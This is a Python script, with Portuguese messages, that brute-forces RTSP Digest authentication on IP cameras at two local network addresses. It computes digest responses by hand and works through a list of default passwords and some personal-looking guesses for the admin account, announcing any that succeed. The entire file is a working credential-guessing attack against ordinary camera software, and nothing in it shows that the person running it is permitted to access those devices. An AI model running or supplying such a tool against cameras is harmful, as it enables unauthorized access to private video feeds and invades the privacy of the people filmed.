import socket
import hashlib
import re

def parse_auth_header(header):
    realm = re.search(r'realm="([^"]+)"', header)
    nonce = re.search(r'nonce="([^"]+)"', header)
    return (realm.group(1) if realm else ""), (nonce.group(1) if nonce else "")

def calc_digest(username, password, realm, nonce, method, uri):
    ha1 = hashlib.md5(f"{username}:{realm}:{password}".encode()).hexdigest()
    ha2 = hashlib.md5(f"{method}:{uri}".encode()).hexdigest()
    resp = hashlib.md5(f"{ha1}:{nonce}:{ha2}".encode()).hexdigest()
    return resp

def test_password(ip, user, pwd):
    s = socket.socket()
    s.settimeout(2)
    try:
        s.connect((ip, 554))
        uri = f"rtsp://{ip}:554/user={user}&pwd={pwd}&channel=1&stream=0.sdp"
        
        # 1. First DESCRIBE to get nonce
        req1 = f"DESCRIBE {uri} RTSP/1.0\r\nCSeq: 1\r\nAccept: application/sdp\r\nUser-Agent: PorteiroVision\r\n\r\n"
        s.sendall(req1.encode())
        res1 = s.recv(2048).decode(errors="ignore")
        
        if "200 OK" in res1:
            return True, "Sem autenticacao (aberta)"
        
        if "401 Unauthorized" not in res1:
            return False, f"Resposta inesperada: {res1[:100]}"
        
        realm, nonce = parse_auth_header(res1)
        if not realm or not nonce:
            return False, "Realm/Nonce nao encontrado"
            
        # 2. Second DESCRIBE with Digest Auth
        auth_resp = calc_digest(user, pwd, realm, nonce, "DESCRIBE", uri)
        auth_header = f'Digest username="{user}", realm="{realm}", nonce="{nonce}", uri="{uri}", response="{auth_resp}"'
        
        req2 = f"DESCRIBE {uri} RTSP/1.0\r\nCSeq: 2\r\nAuthorization: {auth_header}\r\nAccept: application/sdp\r\nUser-Agent: PorteiroVision\r\n\r\n"
        s.sendall(req2.encode())
        res2 = s.recv(2048).decode(errors="ignore")
        
        if "200 OK" in res2:
            return True, "Senha correta!"
        elif "401 Unauthorized" in res2:
            return False, "Senha incorreta"
        else:
            return False, f"Status: {res2.splitlines()[0]}"
    except Exception as e:
        return False, str(e)
    finally:
        s.close()

# Testando senhas potenciais
test_list = [
    "",
    "admin",
    "123456",
    "888888",
    "Beck182Beck",
    "Porteiro@2026",
    "pedro9984",
    "beck",
    "12345",
    "1234",
    "12345678",
    "admin123",
    "root",
    "default",
    "password"
]

for ip in ["192.168.4.41", "192.168.4.43"]:
    print(f"\n--- Testando Digest Auth em {ip} ---")
    for pwd in test_list:
        ok, msg = test_password(ip, "admin", pwd)
        if ok:
            print(f"  >>> SUCESSO! IP {ip} | Senha: '{pwd}' <<<")
            break
        else:
            # print falha
            pass
    else:
        print(f"  Nenhuma das {len(test_list)} senhas básicas funcionou.")
